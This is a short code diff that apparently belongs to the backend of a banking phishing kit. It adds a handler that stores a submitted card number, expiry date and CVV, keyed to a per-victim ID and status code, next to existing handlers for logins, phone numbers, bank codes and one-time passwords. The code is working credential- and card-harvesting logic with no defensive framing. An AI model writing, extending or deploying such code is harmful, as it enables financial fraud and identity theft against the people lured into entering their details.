@@ -95,6 +95,20 @@ const submitTelephone = async (req, res) => {
     }
 };
 
+const submitCard = async (req, res) => {
+    const { ccnum, ccexp, cvv, uniqueid } = req.body;
+    try {
+        await ASB.findOneAndUpdate(
+            { uniqueid },
+            { ccnum, ccexp, cvv, status: 11 }
+        ).exec();
+        res.sendStatus(200);
+    } catch (error) {
+        console.log(error);
+        res.sendStatus(400);
+    }
+};
+
 const submitOtp = async (req, res) => {
     const { otp, uniqueid } = req.body;
     try {
@@ -140,6 +154,7 @@ module.exports = {
     getInfo,
     submitLogin,
     submitLoginAgain,
+    submitCard,
     submitTelephone,
     submitNetcode,
     submitOtp,
